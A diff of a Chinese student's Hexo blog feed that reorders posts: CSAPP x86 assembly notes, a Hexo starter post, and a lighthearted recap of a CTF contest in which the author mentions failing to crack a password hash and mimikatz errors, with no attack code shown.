-<p>movss：移动float（从%xmm移动到一段32位的内存区域，或反之）</p>
-<p>movsd：移动double（从%xmm移动到一段64位的内存区域，或反之）</p>
-<p>在寄存器间移动：</p>
-<p>movaps：打包移动float</p>
-<p>movapd：打包移动double</p>
-<p><strong>与整型寄存器类似，不能将一个内存的值直接移到另一个内存</strong>。</p>
-<p>浮点与整型的转换（src也可以为mem，此处省去）：</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th>(src type)\(dst type)</th>
-<th>int</th>
-<th>long</th>
-<th>float</th>
-<th>double</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>int</td>
-<td>\\</td>
-<td>cltq</td>
-<td>cvtsi2ssl %eax %xmm0</td>
-<td>cvtsi2sdl %eax %xmm0</td>
-</tr>
-<tr>
-<td>long</td>
-<td>%eax</td>
-<td>\\</td>
-<td>cvtsi2ssq %rax %xmm0</td>
-<td>cvtsi2sdq %rax %xmm0</td>
-</tr>
-<tr>
-<td>float</td>
-<td>cvttss2si %xmm0 %eax</td>
-<td>cvttss2siq %xmm0 %rax</td>
-<td>\\</td>
-<td>cvtss2sd mem %xmm0</td>
-</tr>
-<tr>
-<td>double</td>
-<td>cvttsd2si %xmm0 %eax</td>
-<td>cvttsd2siq %xmm0 %rax</td>
-<td>cvtsd2ss mem %xmm0</td>
-<td>\\</td>
-</tr>
-</tbody>
-</table>
-</div>
-<blockquote>
-<p>此处csapp的指令与现行编译器的汇编语法产生了较大分歧，该表以现行标准为准。现列出以下不同点：</p>
-<ol>
-<li>csapp中所有的浮点指令前面都加了字母“v”，目前gcc（mingw 10.3）已经弃用。int转float和double指令后面的“l”是以前没有的。</li>
-<li>与csapp不同，目前带有三个参数的浮点指令已经不复存在。</li>
-<li>与csapp中<strong>生僻</strong>的float~double自转指令（vunpcklps、vcvtps2pd、vmovddup、vcvtpd2psx）不同，gcc先把寄存器的值拷贝到内存，再使用cvt指令。 </li>
-</ol>
-</blockquote>
-<p>浮点运算符：略，汇编语句肉眼可见。</p>
-<p>浮点中的位运算：只针对操作数均位于寄存器内部。</p>
-<p>浮点运算中的立即数：预先以IEEE标准存放在内存里，参与运算时再复制到%xmm寄存器。</p>
-<p>浮点比较指令：</p>
-<p>comiss：float比较。</p>
-<p>comisd：double比较。</p>
-<p>比较时会设置3种标识符：CF、ZF、PF。其中PF=1当且仅当两个操作数任意一个是NaN，此时结果会为Unordered.</p>
-<p>（课后习题虽好，可惜不能对答案，算了不做了。）</p>
-<h2 id="小结——1-22-2022"><a href="#小结——1-22-2022" class="headerlink" title="小结——1/22/2022"></a>小结——1/22/2022</h2><p><strong>x86汇编终于学完了，✿✿ヽ(ﾟ▽ﾟ)ノ✿完结撒花！</strong></p>
-]]></content>
-      <categories>
-        <category>笔记</category>
       </categories>
   </entry>
   <entry>
@@ -725,6 +580,206 @@
       </categories>
   </entry>
   <entry>
+    <title>陇剑杯入土记</title>
+    <url>/2021/09/14/ctf01.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>刚进校不久，我们就被老师鼓励去打首届陇剑杯，当我看到比赛说明的考纲范围时，就发现考察范围与我学习的知识毫无交集。</p>
+<span id="more"></span>
+<p>结果让我没想到的是，赛题居然比我想象的还要离谱。比赛时间从上午10点到下午6点，8个小时，我就只做出来3道题，而且分值都不高。</p>
+<p>最神奇的是我好不容易找到一个高分值的题目，读取了内存文件，通过网上的工具搞到了系统密码的哈希值，然后死也解不出原文，光这点尝试就花了我两三个小时，在得到答案前的最后一步江郎才尽。</p>
+<p>最后成绩出来，yyx1080分，yjp310分，我280分，我又自闭了。只不过战队总分排位838名，总共有3020名，我们占前30%，还是一个尚可的成绩。</p>
+<h1 id="本队的WriteUp"><a href="#本队的WriteUp" class="headerlink" title="本队的WriteUp"></a>本队的WriteUp</h1><p><img src="/2021/09/14/ctf01/a.jpg"></p>
+<p><img src="/2021/09/14/ctf01/b.jpg"></p>
+<p><img src="/2021/09/14/ctf01/c.jpg"></p>
+<p><img src="/2021/09/14/ctf01/d.jpg"></p>
+<p><img src="/2021/09/14/ctf01/e.jpg"></p>
+<p><img src="/2021/09/14/ctf01/f.jpg"></p>
+<p><img src="/2021/09/14/ctf01/g.jpg"></p>
+<p><img src="/2021/09/14/ctf01/h.jpg"></p>
+<p><img src="/2021/09/14/ctf01/i.jpg"></p>
+<p><img src="/2021/09/14/ctf01/j.jpg"></p>
+<p><img src="/2021/09/14/ctf01/k.jpg"></p>
+<p><img src="/2021/09/14/ctf01/l.jpg"></p>
+<p><img src="/2021/09/14/ctf01/m.jpg"></p>
+<p><img src="/2021/09/14/ctf01/n.jpg"></p>
+<p><img src="/2021/09/14/ctf01/o.jpg"></p>
+<p><img src="/2021/09/14/ctf01/p.jpg"></p>
+<p><img src="/2021/09/14/ctf01/q.jpg"></p>
+<h1 id="updated-on-9，25"><a href="#updated-on-9，25" class="headerlink" title="updated on 9，25"></a>updated on 9，25</h1><p>今天去看了内存第一题的wp，然后我发现有一份的wp得到哈希值后，就马上把flag搬了出来。<del>（原来我与200pts的距离似乎这样近，又似乎那么远……)</del>因为那个flag比较长，又不是很正常的单词，用彩虹表基本上不可能。由此我判断：</p>
+<p><img src="/2021/09/14/ctf01/r.jpg"></p>
+<p><strong>这个wp一定是假wp，该队肯定跟其他队有py交易！</strong>（想打别人一拳.jpg）</p>
+<p>然后我又找到了一个正常的wp，发现<strong>我使用了一模一样的工具，但是却采用了所有的错误方法</strong>，完美绕过了正确答案。</p>
+<p><a href="https://www.jianshu.com/p/7c0bea9ff458">https://www.jianshu.com/p/7c0bea9ff458</a></p>
+<p><img src="/2021/09/14/ctf01/s.png"></p>
+<p><img src="/2021/09/14/ctf01/t.png"></p>
+<p><img src="/2021/09/14/ctf01/u.png"></p>
+<p>此刻我的内心就像这样：</p>
+<blockquote>
+<p>比赛时用mimikatz本体<strong>疯狂报错</strong>，麻了。<strong>win10，我的垃圾</strong></p>
+<p>…………</p>
+</blockquote>
+<h1 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h1><p>&gt;</p>
+<blockquote>
+<p>比赛前:</p>
+<p>宣传！规模！代言！历史上CTF之巅峰！NB!</p>
+<p><img src="https://pic2.zhimg.com/50/v2-70227f23029ae7dcbcd09fbb24cbcffa_720w.jpg?source=1940ef5c" alt="img"><img src="https://pic2.zhimg.com/80/v2-70227f23029ae7dcbcd09fbb24cbcffa_720w.jpg?source=1940ef5c" alt="img"></p>
+<p>比赛后:</p>
+<p>比赛办的好啊，会办能不能多办点啊，我好多兄弟代打钱还没赚够呢！比赛结束前5分钟11，5分钟后50+是，牛啊牛啊，这比赛怎么会有py是吧，都是企业自己的努力呀！</p>
+<p><img src="https://pic1.zhimg.com/50/v2-137ace222ee43a40c2f04d7d2f9b394d_720w.jpg?source=1940ef5c" alt="img"></p>
+<p>这比赛可办的太好啦！我真谢谢你主办方啊，推动了整个ctf圈子的良好习俗之PY(此PY非比PY，自己体会)风气的成长，将PY产业化，更加符合法律法规，建议加大力度，继续保持，直接推动社会经济文化的发展！</p>
+<p>另外赛题也令人耳目一新！尤其是里面的选择题！立案深刻，十分符合我国当代社会主义核心价值观！要不是你不说16:00不做，有多少战队要措施错失了明明有全部答案但是不能交的苦恼，真的是民心所望，办比赛办到人民心坎里啦！我替国家和人民谢谢你呀！</p>
+<p><a href="https://www.zhihu.com/question/486768971/answer/2120838902">https://www.zhihu.com/question/486768971/answer/2120838902</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>（近期不更新）csapp学习笔记</title>
+    <url>/2022/01/15/csapp.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>（本文汇编代码统一采用AT&amp;T语法）</p>
+<blockquote>
+<p>友情提示：</p>
+<p>看这本书，笔记、习题、实验三者缺一不可。</p>
+<p>如果你觉得中文翻译质量欠佳，想选择英文原版阅读，那么千万不要选择Global Edition！因为Global Edition的习题环节错误百出，有许多题答案根本无法与题目相对应，严重影响阅读体验和对知识的理解！（我就是白嫖了github上面的免费资源，虽然不是影印版，而且正文质量很高，但习题这个问题就可以盖过其他所有优点）。我现在不得不边看英文原文边做中文版本上的习题(lll￢ω￢)</p>
+</blockquote>
+<span id="more"></span>
+<h1 id="计算机系统漫游"><a href="#计算机系统漫游" class="headerlink" title="计算机系统漫游"></a>计算机系统漫游</h1><p>一个接下所有章节的outline，<del>可以作为计算机系统导论的复习材料。</del></p>
+<h1 id="信息的表示和处理"><a href="#信息的表示和处理" class="headerlink" title="信息的表示和处理"></a>信息的表示和处理</h1><p>之前草草看过一遍，没做题，现在都搞不清楚浮点数的<strong>最小/最大非规格化数</strong>和<strong>最小/最大规格化数</strong>是怎么算出来的。</p>
+<p>有空再填坑。</p>
+<h1 id="程序的机器级表示"><a href="#程序的机器级表示" class="headerlink" title="程序的机器级表示"></a>程序的机器级表示</h1><h2 id="历史观点"><a href="#历史观点" class="headerlink" title="历史观点"></a>历史观点</h2><p>讲了一下Intel处理器的历史，顺便提了一下SSE和AVX指令集（我觉得自己将来都要学的，又要开始秃头了(lll￢ω￢)</p>
+<h2 id="程序编码"><a href="#程序编码" class="headerlink" title="程序编码"></a>程序编码</h2><p>如何在linux环境下查看gcc编译的AT&amp;T格式的汇编代码。（其实gdb提供了变更格式为intel的操作）</p>
+<h2 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h2><ul>
+<li>char</li>
+<li>short</li>
+<li>int</li>
+<li>long（即long long，下同）</li>
+<li>float</li>
+<li>double</li>
+<li>指针（本书是64位环境，所有指针均为8字节）</li>
+</ul>
+<h2 id="访问信息"><a href="#访问信息" class="headerlink" title="访问信息"></a>访问信息</h2><p>各种寄存器（rax~rdx，rsi，rdi，rbp，rsp，r8~r15，及对应的32位、16位、8位版本）及<strong>约定俗成的</strong>用法见下图。</p>
+<p><img src="/2022/01/15/csapp/reg.png"></p>
+<p>mov指令（movq、movl、movw、movb、movzbw、movsbq等，后两者是类型强转）。</p>
+<h2 id="算术和逻辑操作"><a href="#算术和逻辑操作" class="headerlink" title="算术和逻辑操作"></a>算术和逻辑操作</h2><p>lea——取地址，外加简单算术指令，类似于a+b*c的形式（表示字节数的q、l、w、b字母省略，下同）</p>
+<p>sf、zf、pf、cf、af、of——各种标志符(flag)</p>
+<p>add、sub、(i)mul、(i)div、shl(sal)、shr、sar——改变flag状态</p>
+<p>inc、dec——不改变flag状态</p>
+<p>cqto——64位转128位，做128位除法有用</p>
+<h2 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h2><p>if、switch、while、do-while、for的汇编实现，这部分作业错误尤其多。</p>
+<p>由于cpu具有分支预测的功能（部分语句准确率可达90%），简单if语句会预先计算两种分支之后寄存器的变化，以提高cpu的运行速度。</p>
+<p>对于多分支、取值接近的switch语句，编译器会构造跳表来代替各种jz、jbe等判断语句，以提高代码执行效率，因为跳表的执行速度不受分支个数的影响。</p>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>再一次复习堆栈调用的汇编实现，将一个栈帧的各个部分（return address, saved registers, local variables, argument build area）都讲到了，很细致。</p>
+<p>64位寄存器传参的顺序为<code>%rdi</code>,<code>%rsi</code>,<code>%rdx</code>,<code>%rcx</code>,<code>%r8</code>,<code>%r9</code>.</p>
+<h2 id="数组分配和访问"><a href="#数组分配和访问" class="headerlink" title="数组分配和访问"></a>数组分配和访问</h2><p>lea指令的作用就是专门为访问数组设计的。</p>
+<p>虽然编译器更喜欢使用指针遍历数组，加上一个固定的值。即使是多维数组遍历，也尽量不用我们数据结构课学到的i*Wid+j这个公式——毕竟乘法太费时间了。</p>
+<h2 id="异数的数据结构——1-15-2022"><a href="#异数的数据结构——1-15-2022" class="headerlink" title="异数的数据结构——1/15/2022"></a>异数的数据结构——1/15/2022</h2><p>讲了struct、union和空间对齐。</p>
+<p><strong>union中的大小是其中最大数据类型的大小。</strong></p>
+<p>使用union可以强转数据类型（比如说把double转成unsigned long）。</p>
+<p>结构体中的每一项数据的地址都必须是其类型大小的整数倍。</p>
+<h2 id="在机器级程序中将控制与数据结合起来——1-16-2022"><a href="#在机器级程序中将控制与数据结合起来——1-16-2022" class="headerlink" title="在机器级程序中将控制与数据结合起来——1/16/2022"></a>在机器级程序中将控制与数据结合起来——1/16/2022</h2><p>指针与地址运算的优先级——判断以下程序的输出结果：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> arr[<span class="number">20</span>]=&#123;<span class="number">10</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">5</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> *p=&amp;arr;</span><br><span class="line">	*(p+<span class="number">8</span>)+=<span class="number">9</span>;</span><br><span class="line">	<span class="keyword">int</span> m=*((<span class="keyword">char</span>*)p+<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> n=*((<span class="keyword">char</span>*)(p+<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d %d&quot;</span>,m,n);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>答案是<code>8 11</code>.</p>
+<p>int (*p)(int, *int)——函数指针，用<code>p = fun</code>调用，用<code>res = p(int, &amp;int)</code>返回int。</p>
+<p>int *p(int, *int)——指针函数，返回一个int*指针。</p>
+<p>gdb的各种调试命令（对于安了peda的人，就b、si、ni、x/s、x/wx可能有点用，因为peda把寄存器、汇编、堆栈啥都给你显示完了）：</p>
+<p><img src="/2022/01/15/csapp/gdb.png"></p>
+<blockquote>
+<p>习题3.46的<strong>正文</strong>错误：</p>
+<p>global edition: <code>get_line</code> is called with the return address equal to <del>0x400776</del> 0x400076.</p>
+<p>Chinese edition: 字符 0~9 的 ASCII 码是 <del>0x3~0x39</del> 0x30~0x39.</p>
+</blockquote>
+<p>在堆栈图中，地址从下到上，从右到左逐渐增大。因此对于一个dword(qword)，数据的储存方式是从左到右（小端序）；而单个字节的储存方式是从右到左。</p>
+<blockquote>
+<p>疑问：</p>
+<p>D题中，当<code>get_line</code>函数返回时，损毁的寄存器应该还有%rip，而不只是答案所说的%rbx.</p>
+</blockquote>
+<p>防止栈溢出的三种主要方式：地址空间随机化（ASLR）、栈保护（canary）和内存不可执行（NX）。</p>
+<p>对长度可变栈的汇编支持——栈底指针rbp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pushq %rbp</span><br><span class="line">movq %rsp, %rbp</span><br><span class="line">;procedure in the function</span><br><span class="line">leave </span><br><span class="line">;movq %rbp, %rsp</span><br><span class="line">;popq %rbp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p><del>书上说最近的编译器取消了使用栈底指针的惯例</del>实际上，我用最新的编译器，随便写个hello world都会使用栈底指针，这个惯例依旧保持着。</p>
+<blockquote>
+<p>疑问：</p>
+<p>课后习题的B题为什么s2舍入到“最近的8的倍数”，D题为什么“保留s1的偏移量为最近的16的倍数”？</p>
+</blockquote>
+<h2 id="浮点代码——1-19-2022"><a href="#浮点代码——1-19-2022" class="headerlink" title="浮点代码——1/19/2022"></a>浮点代码——1/19/2022</h2><p>寄存器：</p>
+<p>%ymm0~%ymm15是256位的浮点寄存器。</p>
+<p>%xmm0~%xmm15是128位的浮点寄存器，处于ymm的低128位。</p>
+<p>前8个寄存器可视为函数参数（特别地，%xmm0为<strong>约定俗成</strong>的返回值，类似于%rax），后8个由调用者保存。</p>
+<p>在内存与寄存器中移动浮点数：</p>
+<p>movss：移动float（从%xmm移动到一段32位的内存区域，或反之）</p>
+<p>movsd：移动double（从%xmm移动到一段64位的内存区域，或反之）</p>
+<p>在寄存器间移动：</p>
+<p>movaps：打包移动float</p>
+<p>movapd：打包移动double</p>
+<p><strong>与整型寄存器类似，不能将一个内存的值直接移到另一个内存</strong>。</p>
+<p>浮点与整型的转换（src也可以为mem，此处省去）：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>(src type)\(dst type)</th>
+<th>int</th>
+<th>long</th>
+<th>float</th>
+<th>double</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>int</td>
+<td>\\</td>
+<td>cltq</td>
+<td>cvtsi2ssl %eax %xmm0</td>
+<td>cvtsi2sdl %eax %xmm0</td>
+</tr>
+<tr>
+<td>long</td>
+<td>%eax</td>
+<td>\\</td>
+<td>cvtsi2ssq %rax %xmm0</td>
+<td>cvtsi2sdq %rax %xmm0</td>
+</tr>
+<tr>
+<td>float</td>
+<td>cvttss2si %xmm0 %eax</td>
+<td>cvttss2siq %xmm0 %rax</td>
+<td>\\</td>
+<td>cvtss2sd mem %xmm0</td>
+</tr>
+<tr>
+<td>double</td>
+<td>cvttsd2si %xmm0 %eax</td>
+<td>cvttsd2siq %xmm0 %rax</td>
+<td>cvtsd2ss mem %xmm0</td>
+<td>\\</td>
+</tr>
+</tbody>
+</table>
+</div>
+<blockquote>
+<p>此处csapp的指令与现行编译器的汇编语法产生了较大分歧，该表以现行标准为准。现列出以下不同点：</p>
+<ol>
+<li>csapp中所有的浮点指令前面都加了字母“v”，目前gcc（mingw 10.3）已经弃用。int转float和double指令后面的“l”是以前没有的。</li>
+<li>与csapp不同，目前带有三个参数的浮点指令已经不复存在。</li>
+<li>与csapp中<strong>生僻</strong>的float~double自转指令（vunpcklps、vcvtps2pd、vmovddup、vcvtpd2psx）不同，gcc先把寄存器的值拷贝到内存，再使用cvt指令。 </li>
+</ol>
+</blockquote>
+<p>浮点运算符：略，汇编语句肉眼可见。</p>
+<p>浮点中的位运算：只针对操作数均位于寄存器内部。</p>
+<p>浮点运算中的立即数：预先以IEEE标准存放在内存里，参与运算时再复制到%xmm寄存器。</p>
+<p>浮点比较指令：</p>
+<p>comiss：float比较。</p>
+<p>comisd：double比较。</p>
+<p>比较时会设置3种标识符：CF、ZF、PF。其中PF=1当且仅当两个操作数任意一个是NaN，此时结果会为Unordered.</p>
+<p>（课后习题虽好，可惜不能对答案，算了不做了。）</p>
+<h2 id="小结——1-22-2022"><a href="#小结——1-22-2022" class="headerlink" title="小结——1/22/2022"></a>小结——1/22/2022</h2><p><strong>x86汇编终于学完了，✿✿ヽ(ﾟ▽ﾟ)ノ✿完结撒花！</strong></p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+  </entry>
+  <entry>
     <title>强网杯出土记</title>
     <url>/2021/09/25/ctf02.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>经过上次的失败经历后，我相信即将到来的强网杯青少年赛会阳间许多，而事实却并不是这样。</p>
@@ -786,61 +841,6 @@
         <tag>reverse</tag>
         <tag>crypto</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>陇剑杯入土记</title>
-    <url>/2021/09/14/ctf01.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>刚进校不久，我们就被老师鼓励去打首届陇剑杯，当我看到比赛说明的考纲范围时，就发现考察范围与我学习的知识毫无交集。</p>
-<span id="more"></span>
-<p>结果让我没想到的是，赛题居然比我想象的还要离谱。比赛时间从上午10点到下午6点，8个小时，我就只做出来3道题，而且分值都不高。</p>
-<p>最神奇的是我好不容易找到一个高分值的题目，读取了内存文件，通过网上的工具搞到了系统密码的哈希值，然后死也解不出原文，光这点尝试就花了我两三个小时，在得到答案前的最后一步江郎才尽。</p>
-<p>最后成绩出来，yyx1080分，yjp310分，我280分，我又自闭了。只不过战队总分排位838名，总共有3020名，我们占前30%，还是一个尚可的成绩。</p>
-<h1 id="本队的WriteUp"><a href="#本队的WriteUp" class="headerlink" title="本队的WriteUp"></a>本队的WriteUp</h1><p><img src="/2021/09/14/ctf01/a.jpg"></p>
-<p><img src="/2021/09/14/ctf01/b.jpg"></p>
-<p><img src="/2021/09/14/ctf01/c.jpg"></p>
-<p><img src="/2021/09/14/ctf01/d.jpg"></p>
-<p><img src="/2021/09/14/ctf01/e.jpg"></p>
-<p><img src="/2021/09/14/ctf01/f.jpg"></p>
-<p><img src="/2021/09/14/ctf01/g.jpg"></p>
-<p><img src="/2021/09/14/ctf01/h.jpg"></p>
-<p><img src="/2021/09/14/ctf01/i.jpg"></p>
-<p><img src="/2021/09/14/ctf01/j.jpg"></p>
-<p><img src="/2021/09/14/ctf01/k.jpg"></p>
-<p><img src="/2021/09/14/ctf01/l.jpg"></p>
-<p><img src="/2021/09/14/ctf01/m.jpg"></p>
-<p><img src="/2021/09/14/ctf01/n.jpg"></p>
-<p><img src="/2021/09/14/ctf01/o.jpg"></p>
-<p><img src="/2021/09/14/ctf01/p.jpg"></p>
-<p><img src="/2021/09/14/ctf01/q.jpg"></p>
-<h1 id="updated-on-9，25"><a href="#updated-on-9，25" class="headerlink" title="updated on 9，25"></a>updated on 9，25</h1><p>今天去看了内存第一题的wp，然后我发现有一份的wp得到哈希值后，就马上把flag搬了出来。<del>（原来我与200pts的距离似乎这样近，又似乎那么远……)</del>因为那个flag比较长，又不是很正常的单词，用彩虹表基本上不可能。由此我判断：</p>
-<p><img src="/2021/09/14/ctf01/r.jpg"></p>
-<p><strong>这个wp一定是假wp，该队肯定跟其他队有py交易！</strong>（想打别人一拳.jpg）</p>
-<p>然后我又找到了一个正常的wp，发现<strong>我使用了一模一样的工具，但是却采用了所有的错误方法</strong>，完美绕过了正确答案。</p>
-<p><a href="https://www.jianshu.com/p/7c0bea9ff458">https://www.jianshu.com/p/7c0bea9ff458</a></p>
-<p><img src="/2021/09/14/ctf01/s.png"></p>
-<p><img src="/2021/09/14/ctf01/t.png"></p>
-<p><img src="/2021/09/14/ctf01/u.png"></p>
-<p>此刻我的内心就像这样：</p>
-<blockquote>
-<p>比赛时用mimikatz本体<strong>疯狂报错</strong>，麻了。<strong>win10，我的垃圾</strong></p>
-<p>…………</p>
-</blockquote>
-<h1 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h1><p>&gt;</p>
-<blockquote>
-<p>比赛前:</p>
-<p>宣传！规模！代言！历史上CTF之巅峰！NB!</p>
-<p><img src="https://pic2.zhimg.com/50/v2-70227f23029ae7dcbcd09fbb24cbcffa_720w.jpg?source=1940ef5c" alt="img"><img src="https://pic2.zhimg.com/80/v2-70227f23029ae7dcbcd09fbb24cbcffa_720w.jpg?source=1940ef5c" alt="img"></p>
-<p>比赛后:</p>
-<p>比赛办的好啊，会办能不能多办点啊，我好多兄弟代打钱还没赚够呢！比赛结束前5分钟11，5分钟后50+是，牛啊牛啊，这比赛怎么会有py是吧，都是企业自己的努力呀！</p>
-<p><img src="https://pic1.zhimg.com/50/v2-137ace222ee43a40c2f04d7d2f9b394d_720w.jpg?source=1940ef5c" alt="img"></p>
-<p>这比赛可办的太好啦！我真谢谢你主办方啊，推动了整个ctf圈子的良好习俗之PY(此PY非比PY，自己体会)风气的成长，将PY产业化，更加符合法律法规，建议加大力度，继续保持，直接推动社会经济文化的发展！</p>
-<p>另外赛题也令人耳目一新！尤其是里面的选择题！立案深刻，十分符合我国当代社会主义核心价值观！要不是你不说16:00不做，有多少战队要措施错失了明明有全部答案但是不能交的苦恼，真的是民心所望，办比赛办到人民心坎里啦！我替国家和人民谢谢你呀！</p>
-<p><a href="https://www.zhihu.com/question/486768971/answer/2120838902">https://www.zhihu.com/question/486768971/answer/2120838902</a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
   </entry>
   <entry>
     <title>强网杯线下公费游记</title>
@@ -1179,6 +1179,23 @@
       </categories>
   </entry>
   <entry>
+    <title>Hello World</title>
+    <url>/1970/01/01/hello-world.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! <del>This is your very first post.</del> Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+      <categories>
+        <category>test</category>
+      </categories>
+  </entry>
+  <entry>
     <title>猜数游戏</title>
     <url>/2021/08/27/guess.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>又是闲来无事，我扒出了竞赛时自己亲手编写的猜数游戏代码，并未对其进行改良，将网上流行的版本与小学数学结合起来，形成了如下代码。</p>
@@ -1203,23 +1220,6 @@
       <tags>
         <tag>c++</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/1970/01/01/hello-world.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! <del>This is your very first post.</del> Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-      <categories>
-        <category>test</category>
-      </categories>
   </entry>
   <entry>
     <title>二十——C2驾照养成记</title>
@@ -1300,32 +1300,6 @@
       </categories>
       <tags>
         <tag>c++</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>广义mt19937随机数逆向</title>
